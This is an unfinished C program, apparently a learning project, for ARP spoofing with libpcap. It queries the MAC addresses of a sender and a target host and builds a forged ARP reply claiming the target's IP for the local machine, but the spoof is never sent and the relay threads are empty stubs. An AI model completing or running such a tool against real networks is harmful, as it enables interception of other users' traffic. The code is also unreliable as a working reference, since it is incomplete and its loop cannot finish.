#include <pthread.h>
#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "myheader.h"
#include "mytools.h"

#define SIMPLE_LOCALHOST_MAC {localhost_mac[0],localhost_mac[1],localhost_mac[2],localhost_mac[3],localhost_mac[4],localhost_mac[5]}
#define NULL_MAC "\x00\x00\x00\x00\x00\x00"
#define BR_MAC "\xFF\xFF\xFF\xFF\xFF\xFF"

/* ------ static data list ------ */
static struct pcap_pkthdr* pktData;
static uint8_t* readedData;
static SHD shareData;
uint8_t localhost_mac[ETHER_ADDR_LEN];
pthread_mutex_t mutex_lock;

void* thread_arp_processor(char* interface);
void* thread_relay_processor(char* interface);

int main(int argc, char** argv)
{
    char errBuf[PCAP_ERRBUF_SIZE];
    char* interface;
    uint8_t* packet;
    pcap_t* pktDescriptor;
    ETH* ethHeader;
    ARP* arpHeader;

    if (argc != 4)
    {
          printf("Usage : arp_spoof <interface><sender ip><target ip>\n");
          return 1;
    }
    interface = argv[1];

    memcpy(localhost_mac, str_to_mac(get_interface_mac(interface)), ETHER_ADDR_LEN);
    shareData.senderIP = str_to_ip(argv[2]);
    shareData.targetIP = str_to_ip(argv[3]);
    shareData.localhostIP = str_to_ip(get_interface_ip(interface));

    ETH_ARP reqSender = {
        BR_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REQUEST),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.localhostIP),
        NULL_MAC, htonl(shareData.senderIP)
    };
    ETH_ARP reqTarget = {
        BR_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REQUEST),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.localhostIP),
        NULL_MAC, htonl(shareData.targetIP)
    };
    ETH_ARP repSpoof = {
        NULL_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REPLY),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.targetIP),
        NULL_MAC, htonl(shareData.senderIP)
    };
    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);
    if (!pktDescriptor)
    {
        printf("[MainThread] Can't open %s interface resason: %s\n", interface, errBuf);
        return 1;
    }
    // Get senderMAC adn targetMAC
    do{
        packet = &reqSender;
        pcap_sendpacket(pktDescriptor, packet, sizeof(ETH_ARP));
        packet = &reqTarget;
        pcap_sendpacket(pktDescriptor, packet, sizeof(ETH_ARP));

        if(pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
        {

        }
        else
        {
            printf("[MainThread] pcap_next_ex failed.. Program will be retry on this function.\n");
        }
    }while(!memcmp(shareData.senderMAC, NULL_MAC, 6) ||
           !memcmp(shareData.targetMAC, NULL_MAC, 6));

    pcap_close(pktDescriptor);
}

// TODO: Threads has the other pktDescriptor - using Critical section

void* thread_arp_processor(char* interface)
{

}
void* thread_relay_processor(char* interface)
{

}
